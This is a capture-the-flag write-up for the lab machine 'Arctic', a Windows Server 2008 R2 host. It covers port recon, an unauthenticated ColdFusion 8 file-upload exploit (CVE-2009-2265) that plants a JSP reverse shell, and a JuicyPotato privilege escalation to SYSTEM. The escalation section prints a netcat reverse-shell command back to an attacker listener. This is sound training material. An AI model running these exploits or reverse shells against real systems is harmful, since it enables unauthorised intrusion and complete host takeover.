# Arctic — Easy — Windows

**Date:** 3 July 2026

---

## Tags
`#windows` `#coldfusion` `#cve-2009-2265` `#file-upload` `#rce` `#seimpersonate` `#juicypotato` `#privesc`

---

## What I Know

| Item       | Detail                                                       |
| ---------- | ----------------------------------------------------------- |
| Target     | 10.129.26.93                                                 |
| OS         | Windows (Server 2008 R2)                                     |
| Open ports | 135 (MSRPC), 8500 (HTTP/JRun), 49154 (MSRPC)                 |
| Service    | Adobe ColdFusion 8 (on JRun, port 8500)                      |
| Foothold   | CVE-2009-2265 unauth file-upload RCE → shell as tolis        |
| User       | tolis                                                        |
| Privesc    | SeImpersonatePrivilege → JuicyPotato → nt authority\system   |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.26.93

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 16:33 +0100
Nmap scan report for 10.129.26.93
Host is up (0.015s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.50 seconds
```

<img width="1022" height="343" alt="image" src="https://github.com/user-attachments/assets/a995c287-5faa-40a9-b5f8-c750ffd93421" />

```
nmap -sC -sV -p135,8500,49154 10.129.26.93

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-03 16:37 +0100
Nmap scan report for 10.129.26.93
Host is up (0.015s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.57 seconds
```

![[Pasted image 20260703164133.png]]

**What each port tells me:**
- **Port 135 (MSRPC)** — Windows RPC endpoint mapper. Confirms a standard Windows host; not a direct target.
- **Port 8500 (HTTP / JRun)** — JRun is the servlet engine Adobe ColdFusion ships on, and 8500 is ColdFusion's default port. This is the entry point, likely a ColdFusion install.
- **Port 49154 (MSRPC)** — a dynamic high RPC port, normal Windows behaviour. Not actionable on its own.

> **Note:** ColdFusion's built-in web server is notoriously slow to respond on this box, pages can
> take 20–30 seconds to load. That's expected here, not a connectivity problem.

---

## Enumeration Log

```
OBSERVATION: Port 8500 shows a directory index with two folders: /CFIDE and /cfdocs
WHAT IT TELLS ME: This is my only real entry point; the directory names hint at a specific product
WHAT I AM GOING TO TRY:
- Research what commonly runs on port 8500
- Browse both directories for anything useful
WHY:
- Identifying the product narrows the attack surface
- Directory indexes can leak sensitive files
RESULT:
- Port 8500 is the default for Adobe ColdFusion
- Browsing to /CFIDE/administrator/ shows an Adobe ColdFusion 8 Administrator login page
WHAT NEXT:
- Try common passwords (admin, password, arctic)
- Research default creds for ColdFusion 8
- Research known vulnerabilities for ColdFusion 8
```

<img width="692" height="134" alt="image" src="https://github.com/user-attachments/assets/60afe715-3ee2-44a2-9e1c-fa89cb802126" />

<img width="744" height="348" alt="image" src="https://github.com/user-attachments/assets/31058883-113c-428e-b028-8cb79e5649c2" />

<img width="814" height="549" alt="image" src="https://github.com/user-attachments/assets/1e5fb6b0-8169-4885-824a-5036e51b789d" />

<img width="1770" height="708" alt="image" src="https://github.com/user-attachments/assets/fcb58423-2cba-47c2-8ff4-dbce792019c3" />

```
OBSERVATION:
- Common passwords didn't work, and ColdFusion 8 has no default credential
- ColdFusion 8 is vulnerable to CVE-2009-2265, an unauthenticated file-upload RCE (in searchsploit)
WHAT IT TELLS ME: This is an unauthenticated RCE, I can get a foothold without logging in at all
WHAT I AM GOING TO TRY:
- Copy the exploit to my machine, read it to confirm what it does, adjust the parameters, and run it
WHY: To verify the code is safe/correct and use it to exploit CVE-2009-2265 for a foothold
RESULT:
- Edited the exploit for the target/attacker IPs and ports
- Got a foothold as tolis and read user.txt
WHAT NEXT: Enumerate as tolis to find a path to nt authority\system
```

<img width="2291" height="967" alt="image" src="https://github.com/user-attachments/assets/86fb35bd-74d3-4772-b456-da3afd7a666a" />

<img width="2486" height="405" alt="image" src="https://github.com/user-attachments/assets/665bdb5d-8d6b-469f-84b9-c9a89c370123" />

<img width="841" height="280" alt="image" src="https://github.com/user-attachments/assets/f2239110-dae1-460f-921b-15eb183fa81f" />

<img width="1217" height="359" alt="image" src="https://github.com/user-attachments/assets/f93d7b85-43d3-487a-aaf8-69c54ef4492f" />

<img width="761" height="338" alt="image" src="https://github.com/user-attachments/assets/5ef63903-5373-49e1-952e-76a6664a62c2" />

```
OBSERVATION: whoami /priv shows tolis has SeImpersonatePrivilege enabled
WHAT IT TELLS ME: A classic Windows privesc, SeImpersonate can be abused to impersonate a SYSTEM token
WHAT I AM GOING TO TRY: Transfer JuicyPotato.exe and nc.exe to the target and run them to get SYSTEM
WHY: SeImpersonate + JuicyPotato is a well-known path to nt authority\system
RESULT: Escalated to nt authority\system and read root.txt
```

<img width="1063" height="345" alt="image" src="https://github.com/user-attachments/assets/9194f363-be5c-4f05-af0c-999a4b125e45" />

<img width="737" height="328" alt="image" src="https://github.com/user-attachments/assets/05e1d01d-5dcf-4a8c-8f3b-9b8baafa8051" />

<img width="1075" height="233" alt="image" src="https://github.com/user-attachments/assets/6a3c0078-306b-4ffb-b3c8-c22282bc230a" />

<img width="931" height="594" alt="image" src="https://github.com/user-attachments/assets/11d0d4b6-b2fc-4fc0-b5d4-9d52c410b837" />

<img width="566" height="78" alt="image" src="https://github.com/user-attachments/assets/67af4dbd-53db-4374-b5cf-d270726863ed" />

<img width="1903" height="237" alt="image" src="https://github.com/user-attachments/assets/9e315a5e-6b29-4f09-b822-182372070347" />

<img width="825" height="748" alt="image" src="https://github.com/user-attachments/assets/b97f6e4f-ddcd-4c9b-8f6b-624f15871242" />

---

## Foothold

**How I got in:** Port 8500 ran Adobe **ColdFusion 8** (on its default JRun web server), with the admin panel at `/CFIDE/administrator/`. Common passwords failed and there's no default credential, but ColdFusion 8 is vulnerable to **CVE-2009-2265**, an unauthenticated file-upload flaw in the bundled FCKeditor that allows writing an executable file (e.g. a JSP shell) into a web-reachable directory. I used the public exploit, adjusted the IPs/ports, uploaded a JSP reverse shell, and triggered it for a shell as **tolis**.

**Command / exploit used:**
```
searchsploit coldfusion            # locate the CVE-2009-2265 upload exploit
# run the exploit (edited for target/attacker), which uploads shell.jsp, then browse to it:
python exploit.py 10.129.26.93 8500 shell.jsp
```

**Why it worked:** ColdFusion 8 is a decade-old, unpatched version with a public unauthenticated RCE. The FCKeditor upload bug let me place a JSP file in a directory ColdFusion would execute, so no credentials were needed, reaching the web server was enough. (The alternative foothold is a directory-traversal read of `password.properties` to leak and crack the admin hash, then upload a shell via a scheduled task but the unauth upload is more direct.)

---

## Privilege Escalation

**Path taken (tolis → SYSTEM):** Post-foothold, `whoami /priv` showed **SeImpersonatePrivilege** enabled on the tolis account (ColdFusion runs as a service account that holds it). SeImpersonate lets a process impersonate security tokens, which the "Potato" family abuses by coercing a SYSTEM service to authenticate to a local listener and then stealing its token. I transferred **JuicyPotato.exe** and **nc.exe** to the target and used JuicyPotato to execute a command as `nt authority\system`, catching a SYSTEM shell and reading `root.txt`.

```
# transfer JuicyPotato.exe + nc.exe (e.g. via SMB or certutil), then:
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe \
  -a "/c C:\path\nc.exe <LHOST> <LPORT> -e cmd.exe" -t * -c {CLSID}
# attacker listener → nt authority\system
```

**Why it worked:** The service account behind ColdFusion held SeImpersonatePrivilege, and the host was unpatched against the token-impersonation abuse JuicyPotato relies on. Any code execution in a SeImpersonate context on such a host can be escalated straight to SYSTEM, so the foothold account's privilege, not a second credential, was the whole privesc. (The alternative privesc, is abusing MS10-059 kernel, exploits a missing kernel patch to reach the same result.)

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Exploited CVE-2009-2265, an unauthenticated ColdFusion 8 FCKeditor file-upload flaw, to drop and trigger a JSP reverse shell as tolis.
2. **Privesc technique in one sentence:** Abused tolis's SeImpersonatePrivilege with JuicyPotato to impersonate a SYSTEM token and get an `nt authority\system` shell.
6. **Would I recognise this pattern again?** _(Yes / No / Maybe)_
7. **Rule I am adding to [[personal-rules/My-Rules]]:** _(suggestion: "Map unusual ports to their product (8500 → ColdFusion) before anything else. After any Windows foothold, run whoami /priv first: SeImpersonate means a Potato straight to SYSTEM.")_
